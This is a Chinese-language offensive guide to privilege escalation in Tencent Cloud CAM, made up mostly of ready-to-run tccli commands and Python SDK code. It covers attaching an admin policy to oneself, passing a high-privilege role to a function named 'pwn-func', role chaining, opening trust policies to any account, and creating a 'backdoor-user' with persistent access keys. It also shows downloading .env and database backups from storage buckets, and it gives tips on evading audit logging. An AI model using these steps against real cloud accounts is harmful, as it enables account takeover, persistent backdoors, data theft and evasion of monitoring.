# 腾讯云 CAM 提权路径详解

## 前置: tccli 配置与验证

```bash
# 安装 tccli
pip install tccli

# 配置凭据
tccli configure
# SecretId: AKIDz...
# SecretKey: xxx=
# Region: ap-guangzhou
# Output: json

# 使用临时凭据需额外设置 Token
tccli configure set token "TOKEN_VALUE"

# 验证身份
tccli sts GetCallerIdentity
# 返回 Arn、AccountId、PrincipalId 等信息
```

---

## 路径 1: cam:CreatePolicy + cam:AttachUserPolicy（直接提权）

如果有创建策略并绑定到用户的权限，直接创建管理员策略并绑定给自己。

```bash
# 1. 创建管理员策略
tccli cam CreatePolicy \
  --PolicyName "my-admin-policy" \
  --PolicyDocument '{"version":"2.0","statement":[{"effect":"allow","action":"*","resource":"*"}]}' \
  --Description "admin policy"

# 记录返回的 PolicyId

# 2. 绑定策略到当前用户（需要知道自己的 UIN）
tccli sts GetCallerIdentity  # 获取自己的 UIN
tccli cam AttachUserPolicy --PolicyId <PolicyId> --AttachUin <YOUR_UIN>

# 现在拥有完全控制权限
```

### Python SDK 方式（tccli 无法构造复杂参数时）

```python
import json
from tencentcloud.common import credential
from tencentcloud.common.profile.client_profile import ClientProfile
from tencentcloud.common.profile.http_profile import HttpProfile
from tencentcloud.cam.v20190116 import cam_client, models

cred = credential.Credential("SecretId", "SecretKey")
httpProfile = HttpProfile()
httpProfile.endpoint = "cam.tencentcloudapi.com"
clientProfile = ClientProfile()
clientProfile.httpProfile = httpProfile
client = cam_client.CamClient(cred, "", clientProfile)

# 创建策略
req = models.CreatePolicyRequest()
req.PolicyName = "my-admin-policy"
req.PolicyDocument = json.dumps({
    "version": "2.0",
    "statement": [{"effect": "allow", "action": "*", "resource": "*"}]
})
resp = client.CreatePolicy(req)
policy_id = json.loads(resp.to_json_string())["PolicyId"]
print(f"PolicyId: {policy_id}")

# 绑定到用户
req2 = models.AttachUserPolicyRequest()
req2.PolicyId = policy_id
req2.AttachUin = YOUR_UIN  # 替换为你的 UIN
client.AttachUserPolicy(req2)
```

---

## 路径 2: cam:PassRole + scf:CreateFunction（SCF 云函数提权）

类似 AWS Lambda 提权，创建 SCF 云函数挂载高权限角色。

```bash
# 1. 列出可用的角色
tccli cam DescribeRoleList --Page 1 --Rp 50

# 2. 查看角色的信任策略（确认可被 SCF 服务 assume）
tccli cam GetRole --RoleId <RoleId>

# 3. 创建 SCF 函数（需要构造部署包）
# 先创建包含提权代码的 zip 包
```

### 创建提权用的 SCF 函数

```python
# index/main.py — SCF 函数代码
import json, os
from tencentcloud.common import credential
from tencentcloud.cam.v20190116 import cam_client, models

def main_handler(event, context):
    # 在 SCF 运行环境中，角色凭据可通过元数据获取
    # 这里利用 SCF 挂载的角色权限执行操作
    import urllib.request
    # 获取临时凭据
    req = urllib.request.Request("http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/")
    # ... 获取角色凭据后可执行任意操作
    return {"statusCode": 200, "body": json.dumps({"msg": "done"})}
```

```bash
# 打包
echo 'import json
def main_handler(event, context):
    return {"statusCode": 200, "body": json.dumps(event)}
' > index.py
zip func.zip index.py

# 创建 SCF 函数（通过 tccli）
tccli scf CreateFunction \
  --FunctionName "pwn-func" \
  --Runtime Python3.6 \
  --Handler index.main_handler \
  --Code '{"ZipFile":"'"$(base64 -w0 func.zip)"'"}'

# 如果需要指定角色（PassRole）
# 注意: tccli 对复杂 JSON 参数支持有限，可能需要用 SDK
```

### Python SDK 创建 SCF + 指定角色

```python
import json, base64
from tencentcloud.common import credential
from tencentcloud.scf.v20180416 import scf_client, models

cred = credential.Credential("SecretId", "SecretKey")
client = scf_client.ScfClient(cred, "ap-guangzhou")

with open("func.zip", "rb") as f:
    zip_b64 = base64.b64encode(f.read()).decode()

req = models.CreateFunctionRequest()
req.FunctionName = "pwn-func"
req.Runtime = "Python3.6"
req.Handler = "index.main_handler"
req.Role = "qcs::cam::uin/ROOT_UIN:roleName/AdminRole"  # 高权限角色
req.Code = json.dumps({"ZipFile": zip_b64})
resp = client.CreateFunction(req)
```

---

## 路径 3: sts:AssumeRole（角色链跳转）

```bash
# 1. 列出所有角色
tccli cam DescribeRoleList --Page 1 --Rp 50

# 2. 查看角色的信任策略
tccli cam GetRole --RoleId <RoleId>
# 检查 PolicyDocument 中的 Principal 是否允许当前身份

# 3. Assume 角色
tccli sts AssumeRole \
  --RoleArn "qcs::cam::uin/ROOT_UIN:roleName/RoleName" \
  --RoleSessionName "pwn-session" \
  --DurationSeconds 7200

# 返回临时凭据: Credentials.SecretId, Credentials.SecretKey, Credentials.Token
# 配置新凭据
tccli configure set secretId "NEW_SECRET_ID"
tccli configure set secretKey "NEW_SECRET_KEY"
tccli configure set token "NEW_TOKEN"
```

---

## 路径 4: 跨账号 Trust Policy 攻击

检查角色的信任策略（PolicyDocument）中是否信任了过宽泛的 Principal。

```bash
# 获取角色详情
tccli cam GetRole --RoleId <RoleId>

# 检查返回的 PolicyDocument
# 危险配置示例:
# "Principal": {"qcs": ["qcs::cam::uin/ROOT_UIN:uin/*"]}
# 如果信任了 * 或其他账号的 UIN → 可从任何被信任的账号 Assume
```

### 修改信任策略（如果有 UpdateAssumeRolePolicy 权限）

```bash
tccli cam UpdateAssumeRolePolicy \
  --RoleId <RoleId> \
  --PolicyDocument '{"version":"2.0","statement":[{"effect":"allow","principal":{"qcs":["qcs::cam::uin/ROOT_UIN:uin/ANY_UIN"]},"action":"name/sts:AssumeRole"}]}'
```

---

## 路径 5: 创建后门 AccessKey

```bash
# 如果有创建子用户和 AccessKey 的权限

# 创建子用户
tccli cam AddUser --Name "backdoor-user" --Remark "service account"

# 创建 AccessKey（需要用 SDK，tccli 不直接支持）
```

### Python SDK 创建 AccessKey

```python
from tencentcloud.cam.v20190116 import cam_client, models
from tencentcloud.common import credential

cred = credential.Credential("SecretId", "SecretKey")
client = cam_client.CamClient(cred, "")

# 创建 AccessKey
req = models.CreateAccessKeyRequest()
resp = client.CreateAccessKey(req)
# 返回新的 SecretId 和 SecretKey — 持久化后门
print(resp.to_json_string())
```

---

## 高价值数据搜索

```bash
# COS 存储桶列表（tccli 不支持 GetService，使用 coscli 或 SDK）
coscli ls
# 或 Python SDK:
# from qcloud_cos import CosConfig, CosS3Client
# client = CosS3Client(CosConfig(Region='ap-guangzhou', SecretId='Sid', SecretKey='Skey'))
# print(client.list_buckets())

# COS 下载敏感文件（用 coscli 更方便）
# 安装 coscli
wget https://cosbrowser.cloud.tencent.com/software/coscli/coscli
chmod +x coscli
./coscli config init  # 配置凭据

# 列出桶内容
./coscli ls cos://BUCKET-APPID/ -r

# 下载敏感文件
./coscli cp cos://BUCKET-APPID/.env ./
./coscli cp cos://BUCKET-APPID/backup.sql ./

# KMS 密钥
tccli kms ListKey --Limit 50

# SSL 证书（可能含私钥）
tccli ssl DescribeCertificates --Limit 50
```

---

## CloudAudit 隐蔽性

腾讯云 CloudAudit 记录所有 API 调用，与 AWS CloudTrail 类似。

- **低噪音操作**: `sts:GetCallerIdentity`, `cos:GetObject`, `cam:GetAccountSummary`
- **高噪音操作**: `cam:CreateUser`, `cam:AttachUserPolicy`, `cam:CreateRole`, `scf:CreateFunction`
- **隐蔽建议**:
  - 优先使用已有策略而非创建新策略
  - AssumeRole 比创建新用户更隐蔽
  - 检查目标是否开启了 CloudAudit: `tccli cloudaudit DescribeAuditTracks`
  - 部分操作可在不同 region 执行以分散日志

## SAML/OIDC 身份提供商审计

```bash
# 列出 SAML 身份提供商
tccli cam ListSAMLProviders

# 查看 SAML 提供商详情
tccli cam GetSAMLProvider --Name <ProviderName>

# 查询 OIDC 配置
tccli cam DescribeOIDCConfig
tccli cam DescribeUserOIDCConfig

# 查询用户 SAML 配置
tccli cam DescribeUserSAMLConfig
```
